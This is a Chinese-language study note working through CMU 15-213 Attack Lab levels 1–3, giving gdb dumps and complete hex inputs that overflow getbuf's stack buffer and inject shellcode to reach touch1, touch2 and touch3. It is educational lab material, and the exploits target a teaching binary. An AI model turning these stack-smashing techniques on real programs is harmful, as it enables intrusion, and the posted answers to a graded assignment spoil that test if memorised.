# Lab03 attack

标签（空格分隔）： 学习笔记

---

Lab03帮助学生理解缓冲区溢出，感觉要比lab02有用多了

### step1 读题
读题实际上是比较难的一个步骤。可以说大部分时间在理解题目，当题目理解好了，剩下的就不难了。
Hex2raw的意思是将你输入的十六进制数字转化成真正的十六进制
花了几天时间才搞清楚ctarget是无法接受字符串输入的

## 4 Part I: Code Injection Attacks
### 4.1 level 1

这个是最简单的缓冲区溢出，也就是栈溢出，攻击的方式就是直接在ret指令执行之前，替换rsp内存地址处的值为你想要跳转到的函数地址。
我的思路：
想要替换rsp处内存中的值，我们就首先需要找到rsp的值。

    00000000004017a8 <getbuf>:
      4017a8:	48 83 ec 28          	sub    rsp,0x28
      4017ac:	48 89 e7             	mov    rdi,rsp
      4017af:	e8 8c 02 00 00       	call   401a40 <Gets>
      4017b4:	b8 01 00 00 00       	mov    eax,0x1
      4017b9:	48 83 c4 28          	add    rsp,0x28
      4017bd:	c3                   	ret    
      4017be:	90                   	nop
      4017bf:	90                   	nop
      
我们首先找到getbuf函数，使用gdb在0x4017bd处打一个断点。让程序运行到这个位置。查看rsp的值为0x5561dca0.  
进一步查看内存中的值，发现这个栈顶的值为0x0000000000401976。  
就是test函数中  401971:	e8 32 fe ff ff       	call   4017a8 <getbuf> 下面的一个指令的地址  
 401976:	89 c2                	mov    edx,eax

    (gdb) x/4xg 0x5561dca0
    0x5561dca0:     0x0000000000401976      0x0000000000000009
    0x5561dcb0:     0x0000000000401f24      0x0000000000000000

我们只要将输入足够长的字符串，把这个内存地址的值挤掉，变成touch1的函数地址即可。  
在gets函数中的这个指令是存储字符串的

      401a5a:	88 03                	mov    BYTE PTR [rbx],al

rbx的值为0x5561dc78
此处的内存地址中的内容为：

    (gdb) x/6xg 0x5561dc78
    0x5561dc78:     0x0000ab9078563412      0x0000000000000000
    0x5561dc88:     0x0000000000000000      0x0000000000000000
    0x5561dc98:     0x0000000055586000      0x0000000000401976

大概字符串的长度是64*5 bits就是8*5个字节，就能覆盖到0x401976。所以最后答案为

    12 34 56 78 90 ab cd ef ef ef
    12 34 56 78 90 ab cd ef ef ef
    12 34 56 78 90 ab cd ef ef ef
    12 34 56 78 90 ab cd ef ef ef
    c0 17 40 00 00 00 00 00
    

Continuing. Type string:Touch1!: You called touch1() Valid solution for level 1 with target ctarget PASS: Would have posted the following:
    user id bovik
    course  15213-f15
    lab     attacklab
    result  1:PASS:0xffffffff:ctarget:1:12 34 56 78 90 AB CD EF EF EF 12 34 56 78 90 AB CD EF EF EF 12 34 56 78 90 AB CD EF EF EF 12 34 56 78 90 AB CD EF EF EF C0 17 40 00 00 00 00 00  [Inferior 1 (process 11388) exited normally]
    
### 4.2 level 2
这个其实也是栈溢出的原理，只不过在ret到touch2之前必须给传一个参数给edi。这个很纠结，起初我以为是不能执行栈上的数据的，后来网上搜了一下发现这个是可以执行stack中的数据的。
如果可以执行stack中的数据，那么可以操作的空间就大了很多。两次ret可以解决，第一次ret到stack上执行指令，然后操作rsp，第二次ret到touch2，这是我第一次尝试的str：

    00 00 00 00 00 00 00 00
    00 00 00 00 00 00 00 00
    ec 17 40 00 00 00 00 00
    48 c7 c7 fa 97 b9 59 48
    83 ec 20 c3 00 00 00 00
    90 dc 61 55 00 00 00 00
    
但是导致了segment fault。后来网上看了，是因为rsp的值不能改，也就是说，ret到touch2以后rsp和test中的必须保持一致，但是我一直搞不清楚，rsp更改8个字节怎么就能导致段错误呢？
后来修改过stack中的指令，增加了一个pushq，使得进入touch2以后rsp的值不改变，这样就过了。

    (gdb) c
    Continuing.
    Valid solution for level 2 with target ctarget
    PASS: Would have posted the following:
            user id bovik
            course  15213-f15
            lab     attacklab
            result  1:PASS:0xffffffff:ctarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 EC 17 40 00 00 00 00 00 48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 90 DC 61 55 00 00 00 00 
    [Inferior 1 (process 46846) exited normally]
    
### 4.3 level 3
这个题目和上一个题目主要的区别就是需要传一个字符串地址，重点在于字符串的保存，我选择保存在test栈中，最后结果如下：

    00 00 00 00 00 00 00 00 
    00 00 00 00 00 00 00 00 
    00 00 00 00 00 00 00 00 
    00 00 00 00 00 00 00 00 
    00 00 00 00 00 00 00 00  
    b8 dc 61 55 00 00 00 00
    35 39 62 39 39 37 66 61 
    00 00 00 00 00 00 00 00   
    48 c7 c7 a8 dc 61 55
    68 fa 18 40 00 
    c3 00 00 00 

    (gdb) 
    Continuing.
    Type string:Touch3!: You called touch3("59b997fa")
    Valid solution for level 3 with target ctarget
    PASS: Would have posted the following:
            user id bovik
            course  15213-f15
            lab     attacklab
            result  1:PASS:0xffffffff:ctarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 B8 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00 00 00 00 00 00 00 00 48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 
    [Inferior 1 (process 346910) exited normally]

